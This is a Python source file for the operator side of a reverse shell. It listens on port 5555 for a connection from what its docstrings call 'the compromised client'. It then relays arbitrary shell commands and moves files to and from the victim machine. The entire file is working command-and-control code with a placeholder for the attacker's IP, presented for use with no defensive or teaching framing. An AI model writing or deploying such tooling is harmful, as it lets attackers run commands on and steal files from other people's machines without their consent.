import socket
import json
import os


def reliable_send(data):
        """
        Converts the given data (data) into a JSON string and sends it to the client.
        Uses json.dumps() to serialize the data into JSON and target.send() to send the encoded string.
        :param data: Parameter that will contain the data
        :return: None
        """
        jsondata = json.dumps(data)
        target.send(jsondata.encode())


def reliable_recv():
        """
        Receives data from the client in JSON format and decodes it into a Python object.
        Reads data in 1024-byte chunks and accumulates until successfully decoded using json.loads().
        If a ValueError occurs (e.g. incomplete data for JSON decoding), continues reading until all data is received.
        :return: Returns the received data
        """
        data = ''
        while True:
                try:
                        data = data + target.recv(1024).decode().rstrip()
                        return json.loads(data)
                except ValueError:
                        continue


def upload_file(file_name):
        """
        Reads the contents of a specified file (file_name) in binary mode and sends it to the client.
        :param file_name: Name of the file to be read.
        :return: None
        """
        f = open(file_name, 'rb')
        target.send(f.read())


def download_file(file_name):
        """
        Receives a file from the client in blocks of 1024 bytes and writes it to a local file.
        Sets a timeout (settimeout(1)) to prevent the function from getting blocked waiting for data indefinitely.
        :param file_name: Name of the file to be received
        :return: None
        """
        f = open(file_name, 'wb')
        target.settimeout(1)
        chunk = target.recv(1024)
        while chunk:
                f.write(chunk)
                try:
                        chunk = target.recv(1024)
                except socket.timeout as e:
                        break
        target.settimeout(None)
        f.close()


def target_communication():
        """
        Main loop that allows the operator to interact with the compromised client.
        Possible commands are:
                quit: Ends communication with the client.
                clear: Clears the server terminal screen.
                cd <directory>: Does nothing (on the server, since the client is the one who must change directory).
                download <file>: Downloads a file from the client to the server.
                upload <file>: Sends a file from the server to the client.
                Any other command: Sends the command to the client, waits for the response and prints the result.
        :return: None
        """
        while True:
                command = input('* Shell~%s: ' % str(ip))
                reliable_send(command)

                if command == 'quit':
                        break
                elif command == 'clear':
                        os.system('clear')
                elif command[:3] == 'cd ':
                        pass
                elif command[:8] == 'download':
                        download_file(command[9:])
                elif command[:6] == 'upload':
                        upload_file(command[7:])
                else:
                        result = reliable_recv()
                        print(result)


# Socket Creation and Listening
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('!!!Put your Host IP here!!!', 5555))
print('[+] Listening for the incoming connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] target connected from: ' + str(ip))
target_communication()
